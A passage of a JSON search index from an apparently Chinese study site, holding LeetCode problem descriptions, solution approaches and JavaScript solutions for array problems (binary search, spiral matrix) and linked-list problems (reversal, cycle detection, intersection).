题目描述\",\"slug\":\"_1-题目描述\",\"contents\":[\"来源：https://leetcode.cn/problems/binary-search/\",\"给定一个 n 个元素有序的（升序）整型数组 nums 和一个目标值 target ，写一个函数搜索 nums 中的 target，如果目标值存在返回下标，否则返回 -1示例 1:\",\"输入: nums = [-1,0,3,5,9,12], target = 9 输出: 4 解释: 9 出现在 nums 中并且下标为 4 \",\"示例 2:\",\"输入: nums = [-1,0,3,5,9,12], target = 2 输出: -1 解释: 2 不存在 nums 中因此返回 -1 \",\"提示：\",\"你可以假设 nums 中的所有元素是不重复的。\",\"n 将在 [1, 10000]之间。\",\"nums 的每个元素都将在 [-9999, 9999]之间。\"]},{\"header\":\"2. 解题思路\",\"slug\":\"_2-解题思路\",\"contents\":[\"二分查找适用于有序数组的目标值查找，其首先思路很简单：\",\"首先初始化两个指针：left和right，分别指向数组的第一个元素和最后一个元素\",\"获取两个指针之间的中间点的值，并将其和目标值进行比较 \",\"如果目标值和中间值相等，就直接返回中间值的索引\",\"如果目标值大于中间值，就说明目标值在后半部分，将left设置为mid+1，继续进行二分查找\",\"如果目标值小于中间值，就说明目标值在前半部分，将right设置为mid-1，继续进行二分查找\"]},{\"header\":\"3. 题解\",\"slug\":\"_3-题解\",\"contents\":[\"/** * @param {number[]} nums * @param {number} target * @return {number} */ var search = function (nums, target) { let left = 0; let right = nums.length - 1; while (left <= right) { let mid = Math.floor((left + right) / 2); if (nums[mid] === target) { return mid; } else if (nums[mid] < target) { left = mid + 1; } else { right = mid - 1; } } return -1; }; \"]},{\"header\":\"2. 【27】移除元素\",\"slug\":\"_2-【27】移除元素\",\"contents\":[]},{\"header\":\"1. 题目描述\",\"slug\":\"_1-题目描述-1\",\"contents\":[\"来源：https://leetcode.cn/problems/remove-element/\",\"给你一个数组 nums 和一个值 val，你需要原地移除所有数值等于 val 的元素，并返回移除后数组的新长度。\",\"不要使用额外的数组空间，你必须仅使用 O(1) 额外空间并原地修改输入数组\",\"元素的顺序可以改变。你不需要考虑数组中超出新长度后面的元素\",\"说明:\",\"为什么返回数值是整数，但输出的答案是数组呢?\",\"请注意，输入数组是以**「引用」**方式传递的，这意味着在函数里修改输入数组对于调用者是可见的。\",\"你可以想象内部操作如下:\",\"// nums 是以“引用”方式传递的。也就是说，不对实参作任何拷贝 int len = removeElement(nums, val); // 在函数里修改输入数组对于调用者是可见的。 // 根据你的函数返回的长度, 它会打印出数组中 该长度范围内 的所有元素。 for (int i = 0; i < len; i++) { print(nums[i]); } \",\"示例 1：\",\"输入：nums = [3,2,2,3], val = 3 输出：2, nums = [2,2] 解释：函数应该返回新的长度 2, 并且 nums 中的前两个元素均为 2。你不需要考虑数组中超出新长度后面的元素。例如，函数返回的新长度为 2 ，而 nums = [2,2,3,3] 或 nums = [2,2,0,0]，也会被视作正确答案。 \",\"示例 2：\",\"输入：nums = [0,1,2,2,3,0,4,2], val = 2 输出：5, nums = [0,1,4,0,3] 解释：函数应该返回新的长度 5, 并且 nums 中的前五个元素为 0, 1, 3, 0, 4。注意这五个元素可为任意顺序。你不需要考虑数组中超出新长度后面的元素。 \",\"提示：\",\"0 <= nums.length <= 100\",\"0 <= nums[i] <= 50\",\"0 <= val <= 100\"]},{\"header\":\"2. 解题思路\",\"slug\":\"_2-解题思路-1\",\"contents\":[\"使用双指针，定义一个快指针，一个慢指针，快指针遍历时，当遍历的值不是要删除的值时，就存入到慢指针数组中\"]},{\"header\":\"3. 题解\",\"slug\":\"_3-题解-1\",\"contents\":[\"/** * @param {number[]} nums * @param {number} val * @return {number} */ var removeElement = function (nums, val) { let slow = 0; for (let fast = 0; fast < nums.length; fast++) { if (nums[fast] != val) { nums[slow] = nums[fast]; slow++; } } return slow; }; \"]},{\"header\":\"3. 【977】有序数组的平方\",\"slug\":\"_3-【977】有序数组的平方\",\"contents\":[]},{\"header\":\"1. 题目描述\",\"slug\":\"_1-题目描述-2\",\"contents\":[\"来源：https://leetcode.cn/problems/squares-of-a-sorted-array/\",\"给你一个按 非递减顺序 排序的整数数组 nums，返回 每个数字的平方 组成的新数组，要求也按 非递减顺序 排序\",\"示例 1：\",\"输入：nums = [-4,-1,0,3,10] 输出：[0,1,9,16,100] 解释：平方后，数组变为 [16,1,0,9,100] 排序后，数组变为 [0,1,9,16,100] \",\"示例 2：\",\"输入：nums = [-7,-3,2,3,11] 输出：[4,9,9,49,121] \",\"提示：\",\"1 <= nums.length <= 104\",\"-104 <= nums[i] <= 104\",\"nums 已按 非递减顺序 排序\",\"进阶：\",\"请你设计时间复杂度为 O(n) 的算法解决本问题\"]},{\"header\":\"2. 解题思路\",\"slug\":\"_2-解题思路-2\",\"contents\":[\"数组其实是有序的， 只不过负数平方之后可能成为最大数了\",\"那么数组平方的最大值就在数组的两端，不是最左边就是最右边，不可能是中间\",\"此时可以考虑双指针法了，i指向起始位置，j指向终止位置\",\"定义一个新数组result，和A数组一样的大小，让k指向result数组终止位置\",\"如果A[i] * A[i] < A[j] * A[j] 那么result[k--] = A[j] * A[j];\",\"如果A[i] * A[i] >= A[j] * A[j] 那么result[k--] = A[i] * A[i];\"]},{\"header\":\"3. 题解\",\"slug\":\"_3-题解-2\",\"contents\":[\"/** * @param {number[]} nums * @return {number[]} */ var sortedSquares = function (nums) { let res = []; let i = 0; let j = nums.length - 1; let k = nums.length - 1; while (i <= j) { let left = nums[i] * nums[i]; let right = nums[j] * nums[j]; if (left < right) { res[k] = right; k--; j--; } else { res[k] = left; k--; i++; } } return res; }; \"]},{\"header\":\"4. 【209】长度最小的子数组\",\"slug\":\"_4-【209】长度最小的子数组\",\"contents\":[]},{\"header\":\"1. 题目描述\",\"slug\":\"_1-题目描述-3\",\"contents\":[\"来源：https://leetcode.cn/problems/minimum-size-subarray-sum/\",\"给定一个含有 n 个正整数的数组和一个正整数 target。\",\"找出该数组中满足其总和大于等于 target 的长度最小的 连续子数组[numsl, numsl+1, ..., numsr-1, numsr] ，并返回其长度**。**如果不存在符合条件的子数组，返回 0\",\"示例 1：\",\"输入：target = 7, nums = [2,3,1,2,4,3] 输出：2 解释：子数组 [4,3] 是该条件下的长度最小的子数组。 \",\"示例 2：\",\"输入：target = 4, nums = [1,4,4] 输出：1 \",\"示例 3：\",\"输入：target = 11, nums = [1,1,1,1,1,1,1,1] 输出：0 \",\"提示：\",\"1 <= target <= 109\",\"1 <= nums.length <= 105\",\"1 <= nums[i] <= 105\",\"进阶：\",\"如果你已经实现 O(n) 时间复杂度的解法, 请尝试设计一个 O(n log(n)) 时间复杂度的解法。\"]},{\"header\":\"2. 解题思路\",\"slug\":\"_2-解题思路-3\",\"contents\":[\"本题可以使用滑动窗口算法\",\"详见滑动窗口算法模板\"]},{\"header\":\"3. 题解\",\"slug\":\"_3-题解-3\",\"contents\":[\"/** * @param {number} target * @param {number[]} nums * @return {number} */ var minSubArrayLen = function (target, nums) { let left = 0; let right = 0; let curSum = 0; let minLength = 0; while (right < nums.length) { curSum = curSum + nums[right]; while (curSum >= target) { if (right - left + 1 < minLength || minLength == 0) { minLength = right - left + 1; } curSum = curSum - nums[left]; left++; } right++; } return minLength; }; \"]},{\"header\":\"5. 【54】螺旋矩阵\",\"slug\":\"_5-【54】螺旋矩阵\",\"contents\":[]},{\"header\":\"1. 题目描述\",\"slug\":\"_1-题目描述-4\",\"contents\":[\"来源：https://leetcode.cn/problems/spiral-matrix/\",\"给你一个 m 行 n 列的矩阵 matrix ，请按照 顺时针螺旋顺序 ，返回矩阵中的所有元素\",\"示例 1：\",\"输入：matrix = [[1,2,3],[4,5,6],[7,8,9]] 输出：[1,2,3,6,9,8,7,4,5] \",\"示例 2：\",\"输入：matrix = [[1,2,3,4],[5,6,7,8],[9,10,11,12]] 输出：[1,2,3,4,8,12,11,10,9,5,6,7] \",\"提示：\",\"m == matrix.length\",\"n == matrix[i].length\",\"1 <= m, n <= 10\",\"-100 <= matrix[i][j] <= 100\"]},{\"header\":\"2. 解题思路\",\"slug\":\"_2-解题思路-4\",\"contents\":[\"维护未遍历数据的上下左右的边界，每次循环获取最外侧一圈边界上的数据，遍历结束后将边界向中心移动，直至边界相交结束循环\"]},{\"header\":\"3. 题解\",\"slug\":\"_3-题解-4\",\"contents\":[\"/** * @param {number[][]} matrix * @return {number[]} */ var spiralOrder = function (matrix) { // 获取矩阵大小 let m = matrix.length; let n = matrix[0].length; // 定义边界 let up = 0, down = m - 1, left = 0, right = n - 1; let ans = []; while (true) { for (let i = left; i <= right; i++) { ans.push(matrix[up][i]); } up++; if (up > down) { break; } for (let i = up; i <= down; i++) { ans.push(matrix[i][right]); } right--; if (right < left) { break; } for (let i = right; i >= left; i--) { ans.push(matrix[down][i]); } down--; if (down < up) { break; } for (let i = down; i >= up; i--) { ans.push(matrix[i][left]); } left++; if (left > right) { break; } } return ans; }; \"]},{\"header\":\"6. 【59】螺旋矩阵 II\",\"slug\":\"_6-【59】螺旋矩阵-ii\",\"contents\":[]},{\"header\":\"1. 题目描述\",\"slug\":\"_1-题目描述-5\",\"contents\":[\"来源：https://leetcode.cn/problems/spiral-matrix-ii/\",\"给你一个正整数 n ，生成一个包含 1 到 n2 所有元素，且元素按顺时针顺序螺旋排列的 n x n 正方形矩阵 matrix\",\"示例 1：\",\"输入：n = 3 输出：[[1,2,3],[8,9,4],[7,6,5]] \",\"示例 2：\",\"输入：n = 1 输出：[[1]] \",\"提示：\",\"1 <= n <= 20\"]},{\"header\":\"2. 解题思路\",\"slug\":\"_2-解题思路-5\",\"contents\":[\"维护未遍历数据的上下左右的边界，每次循环获取最外侧一圈边界上的数据，遍历结束后将边界向中心移动，直至边界相交结束循环\"]},{\"header\":\"3. 题解\",\"slug\":\"_3-题解-5\",\"contents\":[\"/** * @param {number} n * @return {number[][]} */ var generateMatrix = function (n) { // 定义边界 let up = 0, down = n - 1, left = 0, right = n - 1; let num = 1; let ans = new Array(n).fill(0).map(() => new Array(n).fill(0)); while (true) { for (let i = left; i <= right; i++) { ans[up][i] = num++; } up++; if (up > down) { break; } for (let i = up; i <= down; i++) { ans[i][right] = num++; } right--; if (right < left) { break; } for (let i = right; i >= left; i--) { ans[down][i] = num++; } down--; if (down < up) { break; } for (let i = down; i >= up; i--) { ans[i][left] = num++; } left++; if (left > right) { break; } } return ans; }; \"]}]},\"/data-structures-and-algorithms/leetcode-solution/02-leetcode%E9%A2%98%E8%A7%A3-%E9%93%BE%E8%A1%A8.html\":{\"title\":\"链表\",\"contents\":[{\"header\":\"1. 【2】两数相加\",\"slug\":\"_1-【2】两数相加\",\"contents\":[]},{\"header\":\"1. 题目描述\",\"slug\":\"_1-题目描述\",\"contents\":[\"来源：https://leetcode.cn/problems/add-two-numbers/\",\"给你两个 非空 的链表，表示两个非负的整数。它们每位数字都是按照 逆序 的方式存储的，并且每个节点只能存储 一位 数字\",\"请你将两个数相加，并以相同形式返回一个表示和的链表\",\"你可以假设除了数字 0 之外，这两个数都不会以 0 开头\",\"示例 1：\",\"输入：l1 = [2,4,3], l2 = [5,6,4] 输出：[7,0,8] 解释：342 + 465 = 807. \",\"示例 2：\",\"输入：l1 = [0], l2 = [0] 输出：[0] \",\"示例 3：\",\"输入：l1 = [9,9,9,9,9,9,9], l2 = [9,9,9,9] 输出：[8,9,9,9,0,0,0,1] \",\"提示：\",\"每个链表中的节点数在范围 [1, 100] 内\",\"0 <= Node.val <= 9\",\"题目数据保证列表表示的数字不含前导零\"]},{\"header\":\"2. 解题思路\",\"slug\":\"_2-解题思路\",\"contents\":[\"遍历被相加的两个链表，模拟相加操作，将每个节点依次相加。注意进位问题\"]},{\"header\":\"3. 题解\",\"slug\":\"_3-题解\",\"contents\":[\"/** * Definition for singly-linked list. * function ListNode(val, next) { * this.val = (val===undefined ? 0 : val) * this.next = (next===undefined ? null : next) * } */ /** * @param {ListNode} l1 * @param {ListNode} l2 * @return {ListNode} */ var addTwoNumbers = function (l1, l2) { let resList = new ListNode(0, null); let p1 = l1; //定义指针，来遍历链表l1 let p2 = l2; //定义指针，来遍历链表l2 let p3 = resList; //定义指针，指向结果链表 let carry = 0; //记录每次相加之后的进位的值 while (p1 || p2) { let val1 = p1 ? p1.val : 0; let val2 = p2 ? p2.val : 0; let sum = val1 + val2 + carry; if (sum >= 10) { sum = sum - 10; carry = 1; } else { carry = 0; } p3.next = new ListNode(sum, null); //将结果放到链表中 p3 = p3.next; p1 = p1 ? p1.next : p1; p2 = p2 ? p2.next : p2; } // 如果最后还有进位，直接放在结果链表 if (carry == 1) { p3.next = new ListNode(1, null); } return resList.next; }; \"]},{\"header\":\"2. 【19】删除链表的倒数第N个结点\",\"slug\":\"_2-【19】删除链表的倒数第n个结点\",\"contents\":[]},{\"header\":\"1. 题目描述\",\"slug\":\"_1-题目描述-1\",\"contents\":[\"来源：https://leetcode.cn/problems/remove-nth-node-from-end-of-list/\",\"给定一个链表，删除链表的倒数第 n 个节点，并且返回链表的头结点\",\"示例 1：\",\"输入：head = [1,2,3,4,5], n = 2 输出：[1,2,3,5] \",\"示例 2：\",\"输入：head = [1], n = 1 输出：[] \",\"示例 3：\",\"输入：head = [1,2], n = 1 输出：[1] \",\"提示：\",\"链表中结点的数目为 sz\",\"1 <= sz <= 30\",\"0 <= Node.val <= 100\",\"1 <= n <= sz\",\"进阶：你能尝试使用一趟扫描实现吗？\"]},{\"header\":\"2. 解题思路\",\"slug\":\"_2-解题思路-1\",\"contents\":[\"双指针，使用快慢指针，先让一个快指针走 n 步，然后另一个慢指针一起走，当快指针走到尾的时候，此时慢指针就指向了我们要删除的节点的前一个节点，然后删除要删除的节点即可\"]},{\"header\":\"3. 题解\",\"slug\":\"_3-题解-1\",\"contents\":[\"/** * Definition for singly-linked list. * function ListNode(val, next) { * this.val = (val===undefined ? 0 : val) * this.next = (next===undefined ? null : next) * } */ /** * @param {ListNode} head * @param {number} n * @return {ListNode} */ var removeNthFromEnd = function (head, n) { //设置虚拟头节点 const dummy = new ListNode(); dummy.next = head; // 设置快慢指针 let fast = dummy; let slow = dummy; // 快指针先走n步 while (n !== 0) { fast = fast.next; n--; } // 快慢指针一起走，直到快指针走到最后一个节点 while (fast.next) { fast = fast.next; slow = slow.next; } // 删除慢指针指向的节点（即要删除的节点） slow.next = slow.next.next; return dummy.next; }; \"]},{\"header\":\"3. 【24】两两交换链表中的节点\",\"slug\":\"_3-【24】两两交换链表中的节点\",\"contents\":[]},{\"header\":\"1. 题目描述\",\"slug\":\"_1-题目描述-2\",\"contents\":[\"来源：https://leetcode.cn/problems/swap-nodes-in-pairs/\",\"给你一个链表，两两交换其中相邻的节点，并返回交换后链表的头节点。你必须在不修改节点内部的值的情况下完成本题（即，只能进行节点交换）\",\"示例 1：\",\"输入：head = [1,2,3,4] 输出：[2,1,4,3] \",\"示例 2：\",\"输入：head = [] 输出：[] \",\"示例 3：\",\"输入：head = [1] 输出：[1] \",\"提示：\",\"链表中节点的数目在范围 [0, 100] 内\",\"0 <= Node.val <= 100\"]},{\"header\":\"2. 解题思路\",\"slug\":\"_2-解题思路-2\",\"contents\":[\"使用虚拟头节点，开始时，我们创建一个虚拟头节点，让cur指向虚拟头节点，然后进行交换操作即可\"]},{\"header\":\"3. 题解\",\"slug\":\"_3-题解-2\",\"contents\":[\"/** * Definition for singly-linked list. * function ListNode(val, next) { * this.val = (val===undefined ? 0 : val) * this.next = (next===undefined ? null : next) * } */ /** * @param {ListNode} head * @return {ListNode} */ var swapPairs = function (head) { let dummyHead = new ListNode(); //虚拟头节点 dummyHead.next = head; //虚拟头节点指向head let cur = dummyHead; while (cur.next && cur.next.next) { let temp1 = cur.next; //记录临时节点 let temp2 = cur.next.next.next; //记录临时节点 // 交换操作 cur.next = cur.next.next; cur.next.next = temp1; cur.next.next.next = temp2; cur = cur.next.next; //cur移动两位，准备下一轮交换 } return dummyHead.next; }; \"]},{\"header\":\"4. 【92】反转链表 II\",\"slug\":\"_4-【92】反转链表-ii\",\"contents\":[]},{\"header\":\"1. 题目描述\",\"slug\":\"_1-题目描述-3\",\"contents\":[\"来源：https://leetcode.cn/problems/reverse-linked-list-ii/\",\"给你单链表的头指针 head 和两个整数 left 和 right ，其中 left <= right 。请你反转从位置 left 到位置 right 的链表节点，返回 反转后的链表\",\"示例 1：\",\"输入：head = [1,2,3,4,5], left = 2, right = 4 输出：[1,4,3,2,5] \",\"示例 2：\",\"输入：head = [5], left = 1, right = 1 输出：[5] \",\"提示：\",\"链表中节点数目为 n\",\"1 <= n <= 500\",\"-500 <= Node.val <= 500\",\"1 <= left <= right <= n\",\"进阶： 你可以使用一趟扫描完成反转吗？\"]},{\"header\":\"2. 解题思路\",\"slug\":\"_2-解题思路-3\",\"contents\":[\"使用双指针遍历，一个pre指针指向虚拟头节点，一个cur指针指向头节点，当pre指针指向左边界的前一个节点开始依次执行交换操作即可\"]},{\"header\":\"3. 题解\",\"slug\":\"_3-题解-3\",\"contents\":[\"/** * Definition for singly-linked list. * function ListNode(val, next) { * this.val = (val===undefined ? 0 : val) * this.next = (next===undefined ? null : next) * } */ /** * @param {ListNode} head * @param {number} left * @param {number} right * @return {ListNode} */ var reverseBetween = function (head, left, right) { let dummyHead = new ListNode(); // 定义虚拟头节点 dummyHead.next = head; let pre = dummyHead; let cur = head; for (let i = 0; i < left - 1; i++) { pre = pre.next; cur = cur.next; } for (let i = 0; i < right - left; i++) { let temp = cur.next; cur.next = temp.next; temp.next = pre.next; pre.next = temp; } return dummyHead.next; }; \"]},{\"header\":\"5. 【142】环形链表 II\",\"slug\":\"_5-【142】环形链表-ii\",\"contents\":[]},{\"header\":\"1. 题目描述\",\"slug\":\"_1-题目描述-4\",\"contents\":[\"来源：https://leetcode.cn/problems/linked-list-cycle-ii/\",\"给定一个链表的头节点 head ，返回链表开始入环的第一个节点。 如果链表无环，则返回 null。\",\"如果链表中有某个节点，可以通过连续跟踪 next 指针再次到达，则链表中存在环。 为了表示给定链表中的环，评测系统内部使用整数 pos 来表示链表尾连接到链表中的位置（索引从 0 开始）。如果 pos 是 -1，则在该链表中没有环。注意：pos 不作为参数进行传递，仅仅是为了标识链表的实际情况。\",\"不允许修改 链表。\",\"示例 1：\",\"输入：head = [3,2,0,-4], pos = 1 输出：返回索引为 1 的链表节点 解释：链表中有一个环，其尾部连接到第二个节点。 \",\"示例 2：\",\"输入：head = [1,2], pos = 0 输出：返回索引为 0 的链表节点 解释：链表中有一个环，其尾部连接到第一个节点。 \",\"示例 3：\",\"输入：head = [1], pos = -1 输出：返回 null 解释：链表中没有环。 \",\"提示：\",\"链表中节点的数目范围在范围 [0, 104] 内\",\"-105 <= Node.val <= 105\",\"pos 的值为 -1 或者链表中的一个有效索引\"]},{\"header\":\"2. 解题思路\",\"slug\":\"_2-解题思路-4\",\"contents\":[\"使用快慢指针，快慢指针用于判断链表是否成环，然后推导公式求得入口\",\"详见：代码随想录\"]},{\"header\":\"3. 题解\",\"slug\":\"_3-题解-4\",\"contents\":[\"/** * Definition for singly-linked list. * function ListNode(val) { * this.val = val; * this.next = null; * } */ /** * @param {ListNode} head * @return {ListNode} */ var detectCycle = function (head) { // 定义快慢指针 let fast = head; let slow = head; while (fast && fast.next) { slow = slow.next; //慢指针走一步 fast = fast.next.next; //快指针走两步 if (slow == fast) { // 初次相遇 slow = head; //慢指针回到头节点 while (slow !== fast) { slow = slow.next; //快慢指针一起走 fast = fast.next; //快慢指针一起走 } return slow; } } return null; }; \"]},{\"header\":\"6. 【203】移除链表元素\",\"slug\":\"_6-【203】移除链表元素\",\"contents\":[]},{\"header\":\"1. 题目描述\",\"slug\":\"_1-题目描述-5\",\"contents\":[\"来源：https://leetcode.cn/problems/remove-linked-list-elements/\",\"给你一个链表的头节点 head 和一个整数 val ，请你删除链表中所有满足 Node.val == val 的节点，并返回 新的头节点 。\",\"示例 1：\",\"输入：head = [1,2,6,3,4,5,6], val = 6 输出：[1,2,3,4,5] \",\"示例 2：\",\"输入：head = [], val = 1 输出：[] \",\"示例 3：\",\"输入：head = [7,7,7,7], val = 7 输出：[] \",\"提示：\",\"列表中的节点数目在范围 [0, 104] 内\",\"1 <= Node.val <= 50\",\"0 <= val <= 50\"]},{\"header\":\"2. 解题思路\",\"slug\":\"_2-解题思路-5\",\"contents\":[\"使用虚拟头节点来方便我们操作，定义一个指针来遍历，遍历到符合条件的元素就删除\"]},{\"header\":\"3. 题解\",\"slug\":\"_3-题解-5\",\"contents\":[\"/** * Definition for singly-linked list. * function ListNode(val, next) { * this.val = (val===undefined ? 0 : val) * this.next = (next===undefined ? null : next) * } */ /** * @param {ListNode} head * @param {number} val * @return {ListNode} */ var removeElements = function (head, val) { let dummyHead = new ListNode(); //定义一个虚拟头节点 dummyHead.next = head; let cur = dummyHead; //定义一个指针来指向虚拟头节点 while (cur.next) { if (cur.next.val === val) { cur.next = cur.next.next; } else { cur = cur.next; } } return dummyHead.next; }; \"]},{\"header\":\"7. 【206】反转链表\",\"slug\":\"_7-【206】反转链表\",\"contents\":[]},{\"header\":\"1. 题目描述\",\"slug\":\"_1-题目描述-6\",\"contents\":[\"来源：https://leetcode.cn/problems/reverse-linked-list/\",\"给你单链表的头节点 head ，请你反转链表，并返回反转后的链表\",\"示例 1：\",\"输入：head = [1,2,3,4,5] 输出：[5,4,3,2,1] \",\"示例 2：\",\"输入：head = [1,2] 输出：[2,1] \",\"示例 3：\",\"输入：head = [] 输出：[] \",\"提示：\",\"链表中节点的数目范围是 [0, 5000]\",\"-5000 <= Node.val <= 5000\",\"进阶：链表可以选用迭代或递归方式完成反转。你能否用两种方法解决这道题？\"]},{\"header\":\"2. 解题思路\",\"slug\":\"_2-解题思路-6\",\"contents\":[\"反转两个节点：将n + 1的next指向n；反转多个节点：双指针遍历链表，重复上述操作\",\"使用双指针一前一后遍历链表,然后反转双指针\"]},{\"header\":\"3. 题解\",\"slug\":\"_3-题解-6\",\"contents\":[\"/** * Definition for singly-linked list. * function ListNode(val, next) { * this.val = (val===undefined ? 0 : val) * this.next = (next===undefined ? null : next) * } */ /** * @param {ListNode} head * @return {ListNode} */ var reverseList = function (head) { let cur = head; let pre = null; while (cur) { const temp = cur.next; // 用temp指针保存一下cur的下一个节点，因为接下来要改变cur.next cur.next = pre; // 反转操作 // 更新pre和cur pre = cur; cur = temp; } return pre; }; \"]},{\"header\":\"8. 【707】设计链表\",\"slug\":\"_8-【707】设计链表\",\"contents\":[]},{\"header\":\"1. 题目描述\",\"slug\":\"_1-题目描述-7\",\"contents\":[\"来源：https://leetcode.cn/problems/design-linked-list/\",\"你可以选择使用单链表或者双链表，设计并实现自己的链表。\",\"单链表中的节点应该具备两个属性：val 和 next 。val 是当前节点的值，next 是指向下一个节点的指针/引用。\",\"如果是双向链表，则还需要属性 prev 以指示链表中的上一个节点。假设链表中的所有节点下标从 0 开始。\",\"实现 MyLinkedList 类：\",\"MyLinkedList() 初始化 MyLinkedList 对象。\",\"int get(int index) 获取链表中下标为 index 的节点的值。如果下标无效，则返回 -1 。\",\"void addAtHead(int val) 将一个值为 val 的节点插入到链表中第一个元素之前。在插入完成后，新节点会成为链表的第一个节点。\",\"void addAtTail(int val) 将一个值为 val 的节点追加到链表中作为链表的最后一个元素。\",\"void addAtIndex(int index, int val) 将一个值为 val 的节点插入到链表中下标为 index 的节点之前。如果 index 等于链表的长度，那么该节点会被追加到链表的末尾。如果 index 比长度更大，该节点将 不会插入 到链表中。\",\"void deleteAtIndex(int index) 如果下标有效，则删除链表中下标为 index 的节点。\",\"示例：\",\"输入 [\\\"MyLinkedList\\\", \\\"addAtHead\\\", \\\"addAtTail\\\", \\\"addAtIndex\\\", \\\"get\\\", \\\"deleteAtIndex\\\", \\\"get\\\"] [[], [1], [3], [1, 2], [1], [1], [1]] 输出 [null, null, null, null, 2, null, 3] 解释 MyLinkedList myLinkedList = new MyLinkedList(); myLinkedList.addAtHead(1); myLinkedList.addAtTail(3); myLinkedList.addAtIndex(1, 2); // 链表变为 1->2->3 myLinkedList.get(1); // 返回 2 myLinkedList.deleteAtIndex(1); // 现在，链表变为 1->3 myLinkedList.get(1); // 返回 3 \",\"提示：\",\"0 <= index, val <= 1000\",\"请不要使用内置的 LinkedList 库。\",\"调用 get、addAtHead、addAtTail、addAtIndex 和 deleteAtIndex 的次数不超过 2000 。\"]},{\"header\":\"2. 解题思路\",\"slug\":\"_2-解题思路-7\",\"contents\":[\"使用虚拟头节点解决\"]},{\"header\":\"3. 题解\",\"slug\":\"_3-题解-7\",\"contents\":[\"// 先定义节点 let ListNode = function (val) { this.val = val; this.next = null; }; var MyLinkedList = function () { this.size = 0; this.dummyHead = new ListNode(); //创建一个虚拟头节点 }; /** * @param {number} index * @return {number} */ MyLinkedList.prototype.get = function (index) { if (index < 0 || index >= this.size) { return -1; } let cur = this.dummyHead; while (index > 0) { cur = cur.next; index--; } return cur.next.val; }; /** * @param {number} val * @return {void} */ MyLinkedList.prototype.addAtHead = function (val) { // 生成一个节点，存放的值是val const node = new ListNode(val); // 将node.next指向第一个节点 node.next = this.dummyHead.next; // dummyHead.next指向新节点，使之变成第一个节点 this.dummyHead.next = node; // 链表长度+1 this.size++; }; /** * @param {number} val * @return {void} */ MyLinkedList.prototype.addAtTail = function (val) { // 生成一个节点，存放的值是val const node = new ListNode(val); let cur = this.dummyHead; while (cur.next !== null) { cur = cur.next; } cur.next = node; this.size++; }; /** * @param {number} index * @param {number} val * @return {void} */ MyLinkedList.prototype.addAtIndex = function (index, val) { if (index > this.size) { return; } const node = new ListNode(val); let cur = this.dummyHead; while (index > 0) { cur = cur.next; index--; } node.next = cur.next; cur.next = node; this.size++; }; /** * @param {number} index * @return {void} */ MyLinkedList.prototype.deleteAtIndex = function (index) { if (index < 0 || index >= this.size) { return; } let cur = this.dummyHead; while (index > 0) { cur = cur.next; index--; } cur.next = cur.next.next; this.size--; }; \"]},{\"header\":\"9. 【160】相交链表\",\"slug\":\"_9-【160】相交链表\",\"contents\":[]},{\"header\":\"1. 题目描述\",\"slug\":\"_1-题目描述-8\",\"contents\":[\"来源：https://leetcode.cn/problems/intersection-of-two-linked-lists/\",\"给你两个单链表的头节点 headA 和 headB ，请你找出并返回两个单链表相交的起始节点。如果两个链表不存在相交节点，返回 null 。\",\"图示两个链表在节点 c1 开始相交：\",\"题目数据 保证 整个链式结构中不存在环。\",\"注意，函数返回结果后，链表必须 保持其原始结构 。\",\"自定义评测：\",\"评测系统 的输入如下（你设计的程序 不适用 此输入）：\",\"intersectVal - 相交的起始节点的值。如果不存在相交节点，这一值为 0\",\"listA - 第一个链表\",\"listB - 第二个链表\",\"skipA - 在 listA 中（从头节点开始）跳到交叉节点的节点数\",\"skipB - 在 listB 中（从头节点开始）跳到交叉节点的节点数\",\"评测系统将根据这些输入创建链式数据结构，并将两个头节点 headA 和 headB 传递给你的程序。如果程序能够正确返回相交节点，那么你的解决方案将被 视作正确答案 。\",\"示例 1：\",\"输入：intersectVal = 8, listA = [4,1,8,4,5], listB = [5,6,1,8,4,5], skipA = 2, skipB = 3 输出：Intersected at '8' 解释：相交节点的值为 8 （注意，如果两个链表相交则不能为 0）。 从各自的表头开始算起，链表 A 为 [4,1,8,4,5]，链表 B 为 [5,6,1,8,4,5]。 在 A 中，相交节点前有 2 个节点；在 B 中，相交节点前有 3 个节点。 — 请注意相交节点的值不为 1，因为在链表 A 和链表 B 之中值为 1 的节点 (A 中第二个节点和 B 中第三个节点) 是不同的节点。换句话说，它们在内存中指向两个不同的位置，而链表 A 和链表 B 中值为 8 的节点 (A 中第三个节点，B 中第四个节点) 在内存中指向相同的位置。 \",\"示例 2：\",\"输入：intersectVal = 2, listA = [1,9,1,2,4], listB = [3,2,4], skipA = 3, skipB = 1 输出：Intersected at '2' 解释：相交节点的值为 2 （注意，如果两个链表相交则不能为 0）。 从各自的表头开始算起，链表 A 为 [1,9,1,2,4]，链表 B 为 [3,2,4]。 在 A 中，相交节点前有 3 个节点；在 B 中，相交节点前有 1 个节点。 \",\"示例 3：\",\"输入：intersectVal = 0, listA = [2,6,4], listB = [1,5], skipA = 3, skipB = 2 输出：null 解释：从各自的表头开始算起，链表 A 为 [2,6,4]，链表 B 为 [1,5]。 由于这两个链表不相交，所以 intersectVal 必须为 0，而 skipA 和 skipB 可以是任意值。 这两个链表不相交，因此返回 null 。 \",\"提示：\",\"listA 中节点数目为 m\",\"listB 中节点数目为 n\",\"1 <= m, n <= 3 * 104\",\"1 <= Node.val <= 105\",\"0 <= skipA <= m\",\"0 <= skipB <= n\",\"如果 listA 和 listB 没有交点，intersectVal 为 0\",\"如果 listA 和 listB 有交点，intersectVal == listA[skipA] == listB[skipB]\",\"进阶：你能否设计一个时间复杂度 O(m + n) 、仅用 O(1) 内存的解决方案？\"]},{\"header\":\"2. 解题思路\",\"slug\":\"_2-解题思路-8\",\"contents\":[\"定义两个指针分别指向A、B，两个指针同时遍历，遍历到尾部就去遍历另一个，直到两个指针相遇\"]},{\"header\":\"3. 题解\",\"slug\":\"_3-题解-8\",\"contents\":[\"/** * Definition for singly-linked list. * function ListNode(val) { * this.val = val; * this.next = null; * } */ /** * @param {ListNode} headA * @param {ListNode} headB * @return {ListNode} */ var getIntersectionNode = function (headA, headB) { let p1 = headA; let p2 = headB; while (p1 !== p2) { if (p1 === null) { p1 = headB; } else { p1 = p1.next; } if (p2 === null) { p2 = headA; } else { p2 = p2.next; } } return p1; }; \"]}]},\"/front-end/Interview-notes/01-%E9%9D%A2%E8%AF%95%E7%AC%94%E8%AE%B0-HTML.html\":{\"title\":\"HTML\",\"contents\":[{\"header\":\"1. 